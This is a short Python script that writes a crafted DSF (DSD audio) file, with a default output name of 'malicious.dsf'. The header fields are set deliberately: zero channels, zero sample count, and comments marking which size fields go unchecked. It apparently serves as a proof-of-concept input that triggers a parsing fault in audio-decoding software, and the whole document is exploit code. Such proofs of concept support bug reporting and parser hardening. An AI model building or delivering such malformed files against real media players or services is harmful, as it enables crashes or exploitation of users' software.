import struct, sys

def make_dsf(channel_type=0, channels=0, bits_switch=1, sample_rate=44100*64, block_align=4096):
    out = bytearray()
    # DSD chunk (28 bytes)
    out += b"DSD "
    out += struct.pack('<Q', 28)          # header size (must be 28)
    out += struct.pack('<Q', 0)           # total file size (unchecked, fill later)
    out += struct.pack('<Q', 0)           # id3 pointer (0 -> harmless)
    assert len(out) == 28

    # fmt chunk
    fmt = bytearray()
    fmt += b"fmt "
    fmt += struct.pack('<Q', 52)          # chunk size must be 52
    fmt += struct.pack('<I', 1)           # version = 1
    fmt += struct.pack('<I', 0)           # format id = 0 (DSD raw)
    fmt += struct.pack('<I', channel_type)  # channel type
    fmt += struct.pack('<I', channels)      # channel num
    fmt += struct.pack('<I', sample_rate)   # sample rate (bits/sec, /8 later)
    fmt += struct.pack('<I', bits_switch)   # 1 = LSBF planar, 8 = MSBF planar
    fmt += struct.pack('<Q', 0)             # sample count (audio_size = 0/8*channels = 0)
    fmt += struct.pack('<I', block_align)   # block size per channel
    fmt += struct.pack('<I', 0)             # reserved
    assert len(fmt) == 52
    out += fmt

    # data chunk (header only + a little payload)
    data_payload = b"\x00" * block_align
    data = bytearray()
    data += b"data"
    data += struct.pack('<Q', 12 + len(data_payload))  # chunk size incl. 12-byte header
    data += data_payload
    out += data

    return bytes(out)

if __name__ == "__main__":
    path = sys.argv[1] if len(sys.argv) > 1 else "malicious.dsf"
    with open(path, "wb") as f:
        f.write(make_dsf())
    print("wrote", path)
